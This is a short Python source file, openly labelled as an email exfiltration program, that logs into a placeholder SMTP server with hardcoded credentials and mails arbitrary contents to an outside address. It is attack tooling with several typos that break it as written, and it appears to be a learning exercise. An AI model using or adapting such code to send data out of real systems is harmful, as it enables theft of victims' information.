"""
Description: Email exfiltration program written in python.
Author: Aleksa Zatezalo
Date: June 2, 2023.
"""

import smtplib
import time
import win32com.client

smtp_server = 'smtp.example.com'
smtp_port = 587
smpt_acct = 'time@example'
smtp_passwd = 'seKret'
tgt_accts = ['tim@elsewhere.com']

def plain_email(subject, contents):
    message = f'Sunject: {subject}\nFrom {smpt_acct}\n'
    message += f'To: {tgt_accts}\n\n{contents.decode()}'
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smpt_acct, smtp_passwd)

    #server.ser_debuglevel(1)
    server.sendmail(smtp_acct, tgt_accts, message)
    time.sleep(1)
    server.quit()

